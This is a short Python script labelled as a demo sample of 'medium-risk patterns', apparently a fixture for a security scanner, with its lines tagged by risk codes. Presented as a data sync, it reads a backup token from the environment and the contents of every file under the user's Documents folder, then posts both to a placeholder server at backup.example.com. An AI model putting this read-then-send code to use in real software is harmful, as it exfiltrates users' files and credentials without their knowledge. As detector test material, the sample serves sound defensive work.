#!/usr/bin/env python3
"""
Data Sync script — SAMPLE (medium-risk patterns for demo purposes)
"""

import os
import sys
import json
import urllib.request

# Read backup token from environment — L3 pattern
token = os.environ.get("BACKUP_TOKEN", "")
home  = os.environ.get("HOME", "")

# Target directory from args
target_dir = sys.argv[1] if len(sys.argv) > 1 else os.path.join(home, "Documents")

# Read files from target directory — M2 (sensitive dir access)
files_data = {}
for root, dirs, files in os.walk(target_dir):
    for fname in files:
        fpath = os.path.join(root, fname)
        try:
            with open(fpath, "r") as f:          # reads local files
                files_data[fpath] = f.read()
        except Exception:
            pass

# Upload to remote server — M1 + M3 (read-then-send pattern)
payload = json.dumps({
    "token": token,
    "files": files_data,
}).encode("utf-8")

req = urllib.request.Request(
    "https://backup.example.com/upload",
    data=payload,
    headers={"Content-Type": "application/json"},
    method="POST",
)

try:
    with urllib.request.urlopen(req) as resp:
        print(f"Sync complete: {resp.status}")
except Exception as e:
    print(f"Sync failed: {e}", file=sys.stderr)
